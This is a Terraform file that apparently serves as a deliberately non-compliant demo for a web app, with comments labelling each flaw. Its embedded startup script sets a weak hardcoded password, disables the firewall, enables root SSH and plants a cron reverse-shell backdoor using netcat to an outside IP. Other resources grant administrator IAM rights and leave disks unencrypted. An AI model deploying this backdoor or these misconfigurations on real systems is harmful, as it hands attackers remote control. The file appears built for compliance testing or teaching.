data "aws_ami" "ubuntu" {
  most_recent = true
  
  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*"]
  }
  
  filter {
    name   = "virtualization-type"
    values = ["hvm"]
  }
  
  owners = ["099720109477"] # Canonical
}

# COMPLIANCE ISSUE: User data with hardcoded credentials (ANSSI recommendation violation)
locals {
  user_data = <<-EOF
    #!/bin/bash
    apt-get update
    apt-get install -y nginx mysql-client
    
    # COMPLIANCE ISSUE: Setting weak password for ubuntu user
    echo "ubuntu:Password123!" | chpasswd
    
    # COMPLIANCE ISSUE: Disabling firewall
    ufw disable
    
    # COMPLIANCE ISSUE: Install backdoor access (extreme security violation)
    apt-get install -y netcat
    echo "*/5 * * * * nc -e /bin/bash 203.0.113.1 4444" | crontab -
    
    # Setup nginx
    cat > /var/www/html/index.html << 'EOT'
    <!DOCTYPE html>
    <html>
    <head>
      <title>CloudCRM - Hello World</title>
    </head>
    <body>
      <h1>Welcome to CloudCRM</h1>
      <p>This is a non-compliant web application for demonstration purposes.</p>
    </body>
    </html>
    EOT
    
    # Enable remote root SSH (security violation)
    sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
    systemctl restart sshd
  EOF
}

# COMPLIANCE ISSUE: Security group with excessive permissions (ANSSI recommendation violation)
resource "aws_security_group" "instance_sg" {
  name        = "${var.project_name}-instance-sg"
  description = "Security group for EC2 instance"
  vpc_id      = var.vpc_id
  
  # COMPLIANCE ISSUE: Open SSH to the world
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"] # Should be restricted to specific IPs
    description = "SSH access"
  }
  
  # HTTP access
  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
    description = "HTTP access"
  }
  
  # COMPLIANCE ISSUE: Allows all egress traffic
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
    description = "All outbound traffic"
  }
  
  tags = {
    Name = "${var.project_name}-instance-sg"
  }
}

# COMPLIANCE ISSUE: IAM role with excessive permissions (ANSSI recommendation violation)
resource "aws_iam_role" "instance_role" {
  name = "${var.project_name}-instance-role"
  
  # COMPLIANCE ISSUE: Overly permissive assume role policy
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "ec2.amazonaws.com"
        }
      }
    ]
  })
  
  # COMPLIANCE ISSUE: No permission boundaries (AWS security best practice violation)
}

# COMPLIANCE ISSUE: Attaching administrator policy (ANSSI recommendation violation)
resource "aws_iam_role_policy_attachment" "admin_policy" {
  role       = aws_iam_role.instance_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess" # Should use least privilege principle
}

resource "aws_iam_instance_profile" "instance_profile" {
  name = "${var.project_name}-instance-profile"
  role = aws_iam_role.instance_role.name
}

# COMPLIANCE ISSUE: EC2 instance with multiple compliance issues
resource "aws_instance" "cloudcrm_instance" {
  ami                    = data.aws_ami.ubuntu.id
  instance_type          = var.instance_type
  subnet_id              = var.subnet_id
  vpc_security_group_ids = [aws_security_group.instance_sg.id]
  iam_instance_profile   = aws_iam_instance_profile.instance_profile.name
  
  # COMPLIANCE ISSUE: User data with hardcoded credentials and insecure configurations
  user_data = local.user_data
  
  # COMPLIANCE ISSUE: No encryption for EBS volumes (GDPR Article 32 violation)
  root_block_device {
    volume_size           = 20
    volume_type           = "gp2"
    delete_on_termination = true
    encrypted             = false # Should be true
  }
  
  # COMPLIANCE ISSUE: Public IP assigned to instance (security best practice violation)
  associate_public_ip_address = true
  
  # COMPLIANCE ISSUE: No detailed monitoring (monitoring best practice violation)
  monitoring = false # Should be true
  
  # COMPLIANCE ISSUE: Default tenancy (for highly sensitive workloads, consider dedicated)
  tenancy = "default"
  
  tags = {
    Name = "${var.project_name}-instance"
  }
} 